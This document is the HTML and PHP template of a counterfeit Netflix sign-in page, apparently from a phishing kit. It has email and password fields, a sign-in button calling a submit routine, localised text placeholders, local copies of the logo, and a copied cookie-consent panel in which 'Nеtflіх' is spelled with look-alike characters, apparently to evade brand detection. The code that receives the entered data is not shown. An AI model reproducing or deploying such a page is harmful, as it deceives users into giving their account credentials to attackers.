                </div>
              </header>
            </header>
			    <link type="text/css" rel="stylesheet" href="styles/css/login.css" data-uia="botLink">
    <link type="text/css" rel="stylesheet" href="styles/css/login2.css" data-uia="botLink">

            <div class="default-ltr-cache-8hdzfz eoi9e9o0">
              <div data-uia="login-page-container" class="default-ltr-cache-1osrymp e1puclvk0">
                <header class="default-ltr-cache-1ws1lu8 e13lzdkk2">
    <h1 data-uia="login-page-title" class="default-ltr-cache-1ho9ut0 euy28770"><?php echo $translations['loginTitle']; ?></h1>
	</header>
				
<style>
  .nfTextField {
    color: rgba(255, 255, 255, 0.7);
    background: transparent;
  }
</style>
  <style>
#error1 {
    font-size: 0.8125rem;
    font-weight: 400;
    margin-top: 0.375rem;
    color: rgb(235, 57, 66);
	    fill: currentcolor;
    width: 100%;
}
#error1svg {
    margin-right: 0.25rem;
    top: 0.1875rem;
	    position: relative;
}
</style>
<form class="e13lzdkk1 default-ltr-cache-9beyap" aria-label="Sign In" method="post">
  <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
    <div class="nfInputPlacement">
      <div class="nfEmailPhoneControls">
        <label class="input_id" placeholder="">
          <input type="text" data-uia="login-field" name="userLoginId" class="nfTextField" id="usrInput" value="" tabindex="0" autocomplete="email" spellcheck="false" dir="" placeholder="">
<label for="usrInput" class="placeLabel"><?php echo $translations['inputLabel']; ?></label>
        </label>
      </div>
    </div>
<div id="error1"  style="display: none;" class="form-control_validationMessageStyles__oy4jpq7" dir="ltr" data-uia="login-field+validationMessage" id=":rg:">
  <svg id="error1svg" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['validEmailOrPhoneError']; ?>
</div>
  </div>
  
  <style>

    .password-toggle {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        border: none;
        background: transparent;
        cursor: pointer;
    }
    .input-container {
        position: relative;
    }
    .input-container input {
        padding-right: 40px; /* Make space for the eye icon */
    }
</style>
  
<style>
    .password-toggle {
        cursor: pointer;
        background: none;
        border: none;
        position: absolute;
        right: 10px; /* Adjust as necessary for alignment */
        top: 50%;
        transform: translateY(-50%);
        outline: none; /* Removes focus outline when clicked */
        padding: 0;
    }

    .nfInputPlacement {
        position: relative; /* Ensures that the SVG button can be absolutely positioned */
    }

    .nfTextField {
		border-radius: 6px;  /* Apply rounded corners */
        padding-right: 40px; /* Provides space for the SVG icon inside the input field */
    }

    .icon {
        display: none; /* Hide both icons initially */
        width: 16px;
        height: 16px;
    }

    .icon.show {
        /* Show only when password is in 'text' mode (visible) */
        display: none; /* Hidden by default */
    }

    .icon.hide {
        /* Show only when password is in 'password' mode (hidden) */
        display: block; /* Shown by default */
    }
	
.nfTextField:focus {
    outline: none;  /* Remove default focus outline */
    border: 3.5px solid white;  /* Add white border on focus */
    border-radius: 6px;  /* Apply rounded corners */
}

</style>
  <style>
#error2 {
    font-size: 0.8125rem;
    font-weight: 400;
    margin-top: 0.375rem;
    color: rgb(235, 57, 66);
	    fill: currentcolor;
    width: 100%;
}
#error2svg {
    margin-right: 0.25rem;
    top: 0.1875rem;
	    position: relative;
}
</style>
<div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password">
    <div class="nfInputPlacement">
        <div class="nfPasswordControls">
            <label class="input_id">
                <input type="password" data-uia="password-field" name="password" class="nfTextField" id="vpwd" value="" tabindex="0" autocomplete="password" spellcheck="false" placeholder="">
<label for="password" class="placeLabel"><?php echo $translations['passwordLabel']; ?></label>
            </label>
            <button class="password-toggle" onclick="togglePasswordVisibility(event)">
                <!-- Placeholder for Show SVG (visible password) -->
    <svg  class="icon show" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="EyeSmall" aria-hidden="true">
      <path fill-rule="evenodd" clip-rule="evenodd" d="M14 8L15.1175 9.00062C15.6275 8.43103 15.6275 7.56897 15.1175 6.99938L14 8ZM2 8C0.882523 6.99938 0.882833 6.99903 0.883154 6.99867L0.883848 6.9979L0.885427 6.99614L0.889343 6.9918L0.900191 6.97987L0.933801 6.94347C0.961437 6.91382 0.999518 6.8736 1.04754 6.82431C1.14348 6.72585 1.2797 6.59059 1.45216 6.43083C1.7956 6.11269 2.29067 5.69005 2.90485 5.26581C4.10464 4.43706 5.9066 3.5 8 3.5C10.0934 3.5 11.8954 4.43706 13.0951 5.26581C13.7093 5.69005 14.2044 6.11269 14.5478 6.43083C14.7203 6.59059 14.8565 6.72585 14.9525 6.82431C15.0005 6.8736 15.0386 6.91382 15.0662 6.94347L15.0998 6.97987L15.1107 6.9918L15.1146 6.99614L15.1162 6.9979L15.1168 6.99867C15.1172 6.99903 15.1175 6.99938 14 8C14 8 11.3137 5 8 5C4.68629 5 2 8 2 8ZM2 8L0.882523 6.99938C0.372492 7.56897 0.372492 8.43103 0.882523 9.00062L2 8ZM2 8C0.882523 9.00062 0.882833 9.00097 0.883154 9.00133L0.883848 9.0021L0.885427 9.00386L0.889343 9.0082L0.900191 9.02013L0.933801 9.05653C0.961437 9.08618 0.999518 9.1264 1.04754 9.17569C1.14348 9.27415 1.2797 9.40941 1.45216 9.56917C1.7956 9.88731 2.29067 10.31 2.90485 10.7342C4.10464 11.5629 5.9066 12.5 8 12.5C10.0934 12.5 11.8954 11.5629 13.0951 10.7342C13.7093 10.31 14.2044 9.88731 14.5478 9.56917C14.7203 9.40941 14.8565 9.27415 14.9525 9.17569C15.0005 9.1264 15.0386 9.08618 15.0662 9.05653L15.0998 9.02013L15.1107 9.0082L15.1146 9.00386L15.1162 9.0021L15.1168 9.00133C15.1172 9.00097 15.1175 9.00062 14 8C14 8 11.3137 11 8 11C4.68629 11 2 8 2 8ZM8 10.0002C9.10457 10.0002 10 9.10481 10 8.00024C10 6.89567 9.10457 6.00024 8 6.00024C6.89543 6.00024 6 6.89567 6 8.00024C6 9.10481 6.89543 10.0002 8 10.0002Z" fill="currentColor"></path>
    </svg>  


<svg class="icon hide" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="EyeOffSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.8716 11.9323L14.4697 15.5304L15.5304 14.4697L1.53039 0.469727L0.469727 1.53039L3.70008 4.76074C3.4123 4.92781 3.14639 5.09903 2.90487 5.26585C2.2907 5.69009 1.79562 6.11273 1.45218 6.43087C1.27972 6.59063 1.1435 6.72589 1.04756 6.82436C0.999541 6.87364 0.961461 6.91386 0.933825 6.94351L0.900214 6.97991L0.889367 6.99184L0.885451 6.99618L0.883872 6.99794L0.883177 6.99871C0.882857 6.99907 0.882547 6.99942 2.00002 8.00004L0.882547 6.99942C0.372515 7.56901 0.372515 8.43107 0.882547 9.00066L2.00002 8.00004C0.882547 9.00066 0.882857 9.00101 0.883177 9.00137L0.883872 9.00214L0.885451 9.0039L0.889367 9.00824L0.900214 9.02017L0.933825 9.05657C0.961461 9.08622 0.999541 9.12644 1.04756 9.17573C1.1435 9.27419 1.27972 9.40945 1.45218 9.56921C1.79562 9.88735 2.2907 10.31 2.90487 10.7342C4.10467 11.563 5.90663 12.5 8.00002 12.5C9.04223 12.5 10.0122 12.2678 10.8716 11.9323ZM9.69036 10.751C9.15423 10.9059 8.58697 11 8.00002 11C4.68632 11 2.00002 8.00004 2.00002 8.00004C2.00002 8.00004 3.11902 6.75037 4.80347 5.86413L6.15837 7.21903C6.05642 7.45904 6.00002 7.72308 6.00002 8.00029C6.00002 9.10485 6.89545 10.0003 8.00002 10.0003C8.27723 10.0003 8.54127 9.94389 8.78128 9.84194L9.69036 10.751ZM14.5479 9.56921C14.2266 9.8668 13.7727 10.2558 13.2127 10.6521L12.1345 9.57383C13.2837 8.80006 14 8.00004 14 8.00004C15.1175 9.00066 15.1172 9.00101 15.1169 9.00137L15.1162 9.00214L15.1146 9.0039L15.1107 9.00824L15.0998 9.02017L15.0662 9.05657C15.0386 9.08622 15.0005 9.12644 14.9525 9.17573C14.8565 9.27419 14.7203 9.40945 14.5479 9.56921ZM14 8.00004C15.1175 6.99942 15.1172 6.99907 15.1169 6.99871L15.1162 6.99794L15.1146 6.99618L15.1107 6.99184L15.0998 6.97991L15.0662 6.94351C15.0386 6.91386 15.0005 6.87364 14.9525 6.82436C14.8565 6.72589 14.7203 6.59063 14.5479 6.43087C14.2044 6.11273 13.7093 5.69009 13.0952 5.26585C11.8954 4.4371 10.0934 3.50004 8.00002 3.50004C7.39642 3.50004 6.81704 3.57795 6.26934 3.7087L7.5768 5.01616C7.71661 5.00557 7.85774 5.00004 8.00002 5.00004C11.3137 5.00004 14 8.00004 14 8.00004ZM14 8.00004L15.1175 6.99942C15.6275 7.56901 15.6275 8.43107 15.1175 9.00066L14 8.00004Z" fill="currentColor"></path></svg>
            </button>
        </div>
    </div>
<div id="error2" style="display: none;" class="form-control_validationMessageStyles__oy4jpq7" dir="ltr" data-uia="login-field+validationMessage" id=":rg:">
  <svg id="error2svg" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-13htjwu e1vkmu653">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path>
  </svg><?php echo $translations['passwordRequirement']; ?>

</div></div>

<script>
function togglePasswordVisibility(event) {
    event.preventDefault(); // Prevents any form action on click

    var passwordInput = document.getElementById('vpwd');
    var isPasswordVisible = passwordInput.type === 'text';
    var showIcon = document.querySelector('.icon.show');
    var hideIcon = document.querySelector('.icon.hide');

    // Toggle the type of input and the visibility of icons
    if (isPasswordVisible) {
        passwordInput.type = 'password';
        showIcon.style.display = 'none';
        hideIcon.style.display = 'block';
    } else {
        passwordInput.type = 'text';
        showIcon.style.display = 'block';
        hideIcon.style.display = 'none';
    }

    // Delay re-focusing the input field
    setTimeout(() => {
        passwordInput.focus();
    }, 100);
}
</script>


								
<button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-1qj5r49 e1ax5wel2" data-uia="login-submit-button" dir="ltr" id="dom-login-button" onclick="submit_form()" type="button">
    <?php echo $translations['signInButton']; ?>
</button>
<p class=" default-ltr-cache-1und4li euy28770"><?php echo $translations['orText']; ?></p>
<button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-52t4v6 e1ax5wel2" data-uia="login-toggle-button" dir="ltr" role="button" type="button">
    <?php echo $translations['useSignInCodeButton']; ?>
</button>
<a class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0  default-ltr-cache-yzjbl5 e1gz2xdw0" data-uia="login-help-link" dir="ltr" role="link" href="#">
    <?php echo $translations['forgotPasswordLink']; ?>
</a>
</form>

                <footer class="default-ltr-cache-banb1s e13lzdkk0">
                  <div class="default-ltr-cache-1r5gb7q e182k4ex0">
                    <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-a3vgnl eo28fys1" data-uia="remember-me-field+container" dir="ltr">
                      <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">
                        <input class="checkbox_nativeElementStyles__1axue5s0" dir="ltr" type="checkbox" id=":r6:" name="rememberMe" data-uia="remember-me-field" checked="">
                        <div aria-hidden="true" class="form-control_controlChromeStyles__oy4jpq4" dir="ltr">
                          <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CheckmarkSmall" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M13.4696 3.46973L14.5303 4.53039L6.53026 12.5304C6.23737 12.8233 5.7625 12.8233 5.4696 12.5304L1.4696 8.53039L2.53026 7.46973L5.99993 10.9394L13.4696 3.46973Z" fill="currentColor"></path>
                          </svg>
                        </div>
                      </div>
<label for=":r6:" class="form-control_labelStyles__oy4jpq5" dir="ltr" data-uia="remember-me-field+label">
    <?php echo $translations['rememberMe']; ?>
</label>
</div>
</div>
<p data-uia="login-signup-now" class="ec64ufc0 default-ltr-cache-160ge2v euy28770">
    <?php echo $translations['newToNetflix']; ?> <a class="" target="_self" href="#"><?php echo $translations['signUpNow']; ?></a>.
</p>
<div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
    <p>
        <span><?php echo $translations['recaptchaNotice']; ?></span>&nbsp; <button class="recaptcha-terms-of-use--link-button" data-uia="recaptcha-learn-more-button">
            <?php echo $translations['learnMore']; ?>
        </button>
    </p>
</div>

                </footer>
              </div>
            </div>
            <footer class="default-ltr-cache-1m4t6ky e1s9oty30">
              <footer class=" default-ltr-cache-3sf4re eyieukx5">
                <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d" dir="ltr">
                  <div data-layout="container" class="layout-container_styles__12wd1go1g" dir="ltr" style="--_12wd1go1: 0px; --_12wd1go2: row; --_12wd1go5: 0px; --_12wd1go6: 0px; --_12wd1go7: 100%;">
                    <div data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpg: 0 0 100%; --zc08zp7: 0px;">
                      <div class="default-ltr-cache-82qlwu eyieukx4">
                        <a href=""><?php echo $translations['questionsContactUs']; ?></a>
                      </div>
                    </div>
                    <div data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpg: 0 0 100%; --zc08zp7: 0px;">
                      <div class="default-ltr-cache-2lwb1t eyieukx3">
                        <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d" dir="ltr">
                          <ul data-layout="container" class="layout-container_styles__12wd1go1g" dir="ltr" style="--_12wd1go1: 0.75rem; --_12wd1go2: row; --_12wd1go5: 0px; --_12wd1go6: 1rem; --_12wd1go7: calc(100% + 0.75rem);">
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['faq']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['helpCenter']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['termsOfUse']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['privacy']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['cookiePreferences']; ?></a>
                            </li>
                            <li data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zpy: 0 0 calc(50% - 0.75rem); --zc08zp1g: 0 0 calc(50% - 0.75rem); --zc08zp1y: 0 0 calc(25% - 0.75rem); --zc08zp2g: 0 0 calc(25% - 0.75rem); --zc08zp2y: 0 0 calc(25% - 0.75rem); --zc08zp7: 0px;">
                              <a data-uia="footer-link" target="_self" class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0" dir="ltr" role="link" href="#"><?php echo $translations['corporateInformation']; ?></a>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d" dir="ltr">
                      <div data-layout="container" class="layout-container_styles__12wd1go1g" dir="ltr" style="--_12wd1go9: 0.5rem; --_12wd1goh: 0.5rem; --_12wd1gop: 1.5rem; --_12wd1gox: 1.5rem; --_12wd1go15: 1.5rem; --_12wd1go2: row; --_12wd1go5: 0px; --_12wd1go6: 0.5rem; --_12wd1gof: calc(100% + 0.5rem); --_12wd1gon: calc(100% + 0.5rem); --_12wd1gov: calc(100% + 1.5rem); --_12wd1go13: calc(100% + 1.5rem); --_12wd1go1b: calc(100% + 1.5rem);">
                        <div data-layout="item" class="layout-item_styles__zc08zp30" dir="ltr" style="--zc08zp0: auto; --zc08zpg: 0 auto; --zc08zp7: 0px;">
                          <div class="form-control_containerStyles__oy4jpq0  default-ltr-cache-crcdk0 e1jlx6kl1" data-uia="language-picker+container" dir="ltr">
                            <label for=":ra:" class="form-control_labelStyles__oy4jpq5 screen-reader-only_screenReaderOnly__h8djxf0" dir="ltr" data-uia="language-picker+label">Select Language</label>
                            <div class="form-control_controlWrapperStyles__oy4jpq1" dir="ltr">

                              <div aria-hidden="true" class="form-control_controlChromeStyles__oy4jpq4" dir="ltr">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CaretDownSmall" aria-hidden="true">
                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path>
                                </svg>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </footer>
            </footer>
          </div>
        </div>
      </div>
    </div>
    <div>


    </div>

    <div id="onetrust-consent-sdk" data-nosnippet="true">
      <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
      <div id="onetrust-pc-sdk" class="otPcTab ot-hide ot-fade-in otRelFont" lang="en" aria-label="Preference center" role="region">
        <div role="dialog" aria-modal="true" style="height: 100%;" aria-label="Privacy Preference Center">
          <!-- pc header -->
          <div class="ot-pc-header" role="presentation">
            <!-- Header logo -->
            <div class="ot-pc-logo" role="img" aria-label="Nеtflіх Logo">
              <img alt="Nеtflіх Logo" src="./login_files/Netflix_Logo_PMS.png">
            </div>
            <div class="ot-title-cntr">
              <h2 id="ot-pc-title">Privacy Preference Center</h2>
              <div class="ot-close-cntr">
                <button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Close" style="background-image: url(&quot;https://help.nflxext.com/helpcenter/OneTrust/oneTrust_production/consent/87b6a5c0-0104-4e96-a291-092c11350111/01938dc4-59b3-7bbc-b635-c4131030e85f/logos/static/ot_close.svg&quot;);"></button>
              </div>
            </div>
          </div>
          <!-- content -->
          <!-- Groups / Sub groups with cookies -->
          <div id="ot-pc-content" class="ot-pc-scrollbar ot-sdk-row">
            <div class="ot-optout-signal ot-hide">
              <div class="ot-optout-icon">
                <svg xmlns="http://www.w3.org/2000/svg">
                  <path class="ot-floating-button__svg-fill" d="M14.588 0l.445.328c1.807 1.303 3.961 2.533 6.461 3.688 2.015.93 4.576 1.746 7.682 2.446 0 14.178-4.73 24.133-14.19 29.864l-.398.236C4.863 30.87 0 20.837 0 6.462c3.107-.7 5.668-1.516 7.682-2.446 2.709-1.251 5.01-2.59 6.906-4.016zm5.87 13.88a.75.75 0 00-.974.159l-5.475 6.625-3.005-2.997-.077-.067a.75.75 0 00-.983 1.13l4.172 4.16 6.525-7.895.06-.083a.75.75 0 00-.16-.973z" fill="#FFF" fill-rule="evenodd"></path>
                </svg>
              </div>
              <span></span>
            </div>
            <div class="ot-sdk-container ot-grps-cntr ot-sdk-column">
              <div class="ot-sdk-four ot-sdk-columns ot-tab-list" aria-label="Cookie Categories">
                <ul class="ot-cat-grp" role="tablist" aria-orientation="vertical">
                  <li class="ot-abt-tab" role="presentation">
                    <!-- About Privacy container -->
                    <div class="ot-active-menu category-menu-switch-handler" role="tab" tabindex="0" aria-selected="true" aria-controls="ot-tab-desc">
                      <h3 id="ot-pvcy-txt">General Description</h3>
                    </div>
                  </li>
                  <li class="ot-cat-item ot-always-active-group ot-vs-config" role="presentation" data-optanongroupid="C0001">
                    <div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0001">
                      <h3 id="ot-header-id-C0001">Essential Cookies</h3>
                    </div>
                  </li>
                  <li class="ot-cat-item ot-always-active-group ot-vs-config" role="presentation" data-optanongroupid="C0002">
                    <div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0002">
                      <h3 id="ot-header-id-C0002">First Party Performance and Functionality Cookies</h3>
                    </div>
                  </li>
                  <li class="ot-cat-item ot-vs-config" role="presentation" data-optanongroupid="C0003">
                    <div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0003">
                      <h3 id="ot-header-id-C0003">Third Party Performance and Functionality Cookies</h3>
                    </div>
                  </li>
                  <li class="ot-cat-item ot-vs-config" role="presentation" data-optanongroupid="C0004">
                    <div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0004">
                      <h3 id="ot-header-id-C0004">Advertising Cookies</h3>
                    </div>
                  </li>
                </ul>
              </div>
              <div class="ot-tab-desc ot-sdk-eight ot-sdk-columns">
                <div class="ot-desc-cntr" id="ot-tab-desc" tabindex="0" role="tabpanel" aria-labelledby="ot-pvcy-hdr">
                  <h4 id="ot-pvcy-hdr">General Description</h4>
                  <p id="ot-pc-desc" class="ot-grp-desc">
                    <br>This cookie tool will help you understand the use of cookies on theNеtflіх service, and how you can control the use of these cookies. <br>
                    <br> Privacy settings in most browsers allow you to prevent your browser from accepting some or all cookies, notify you when it receives a new cookie, or disable cookies altogether. If your browser disables all cookies, then information will not be collected or stored via the cookies listed in this tool. This means that your use of theNеtflіх service may be impaired. <br>
                    <br> Please note that when you use this cookie tool to opt out of certain cookies, your opt out preferences are recorded by placing a cookie on your device. Therefore, your browser must be configured to accept cookies in order for your preferences to take effect. Also, if you delete or clear your cookies, or change your web browser, you will need to reset your cookie preferences. <br>
                    <br> For more information on our use of cookies, please visit the <a href="#">Cookies and Internet Advertising</a> section of our <a href="">Privacy Statement.</a>
                    <br>
                    <br>
                  </p>
                </div>
                <div class="ot-desc-cntr ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001">
                  <div class="ot-grp-hdr1">
                    <h4 class="ot-cat-header">Essential Cookies</h4>
                    <div class="ot-tgl-cntr">
                      <div class="ot-always-active">Always Active</div>
                    </div>
                  </div>
                  <p class="ot-grp-desc ot-category-desc">These cookies are strictly necessary to provide theNеtflіх service. For example, we and our Service Providers may use these cookies to authenticate and identify users when they use our websites so we can provide our service to them. They also help us to administer and operate our business; for safety, security and fraud prevention; and to comply with law and enforce our <a href="" rel="nofollow">Terms of Use.</a> As these cookies are strictly necessary to provide our service, you cannot opt out of them. <br>
                    <br> Lifespan: Most cookies are session cookies (e.g. only active until you close your browser). Some cookies are active for a longer time, ranging from 3 to 12 months. The cookies used to prevent fraud and maintain the security or our services are active for a maximum period of 24 months.
                  </p>
                  <div class="ot-hlst-cntr">
                    <button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0001">Cookies Details‎</button>
                  </div>
                </div>
                <div class="ot-desc-cntr ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0002">
                  <div class="ot-grp-hdr1">
                    <h4 class="ot-cat-header">First Party Performance and Functionality Cookies</h4>
                    <div class="ot-tgl-cntr">
                      <div class="ot-always-active">Always Active</div>
                    </div>
                  </div>
                  <p class="ot-grp-desc ot-category-desc">These cookies help us to customize and enhance your online experience with theNеtflіх service. For example, they help us to remember your preferences and prevent you from needing to re-enter information you previously provided (for example, during member sign up). We also use these cookies to collect information (such as popular pages, conversion rates, viewing patterns, click-through and other information) about our visitors' use of theNеtflіх service so that we can provide our service and also to research, analyze and improve our services. Deletion of these types of cookies may result in limited functionality of our service. <br>
                    <br> Lifespan: Most cookies are only active for one day. Some cookies are active for a longer time, ranging from 3 to 12 months.
                  </p>
                  <div class="ot-hlst-cntr">
                    <button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0002">Cookies Details‎</button>
                  </div>
                </div>
                <div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0003">
                  <div class="ot-grp-hdr1">
                    <h4 class="ot-cat-header">Third Party Performance and Functionality Cookies</h4>
                    <div class="ot-tgl">
                      <input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003" role="switch" class="category-switch-handler" data-optanongroupid="C0003" checked="" aria-labelledby="ot-header-id-C0003">
                      <label class="ot-switch" for="ot-group-id-C0003">
                        <span class="ot-switch-nob"></span>
                        <span class="ot-label-txt">Third Party Performance and Functionality Cookies</span>
                      </label>
                    </div>
                    <div class="ot-tgl-cntr"></div>
                  </div>
                  <p class="ot-grp-desc ot-category-desc">These cookies, set by third parties, help us to customize and enhance your online experience withNеtflіх. The cookies in this category are only set on Tudum (our official fandom site). We use these cookies to provide you experiences hosted by third parties, like displaying social media content. For further information on how these third parties use such cookies, please see the privacy information provided by the third party on their website. Deletion of these types of cookies may result in limited functionality.</p>
                  <div class="ot-hlst-cntr">
                    <button class="ot-link-btn category-host-list-handler" aria-label="Cookie Details button opens Cookie List menu" data-parent-id="C0003">Cookies Details‎</button>
                  </div>
                </div>
                <div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0004">
                  <div class="ot-grp-hdr1">
                    <h4 class="ot-cat-header">Advertising Cookies</h4>
                    <div class="ot-tgl">
                      <input type="checkbox" name="ot-group-id-C0004" id="ot-group-id-C0004" role="switch" class="category-switch-handler" data-optanongroupid="C0004" checked="" aria-labelledby="ot-header-id-C0004">
                      <label class="ot-switch" for="ot-group-id-C0004">
                        <span class="ot-switch-nob"></span>
                        <span class="ot-label-txt">Advertising Cookies</span>
                      </label>
                    </div>
                    <div class="ot-tgl-cntr"></div>
                  </div>
                  <p class="ot-grp-desc ot-category-desc">These cookies collect information via the Nеtflіх service in connection with “Advertisements” (as defined in our <a href="#">Terms of Use</a>). “Advertising Companies” (as defined in our <a href="">Privacy Statement</a>) may also collect information via these cookies in connection with Advertisements. If you opt out of advertising cookies, you may still see Advertisements on theNеtflіх service but they will not be based on information collected from advertising cookies. <br>
                    <br> Nеtflіх Marketing Providers” (also defined in the our <a href="#">Privacy Statement</a>) may also collect information via advertising cookies in connection with Nеtflіх marketing campaigns promoting theNеtflіх service orNеtflіх content, such as our ads on third party services. If you opt out of advertising cookies, you may still seeNеtflіх marketing campaigns promoting theNеtflіх service orNеtflіх content, but they will not be based on information collected from these advertising cookies. <br>
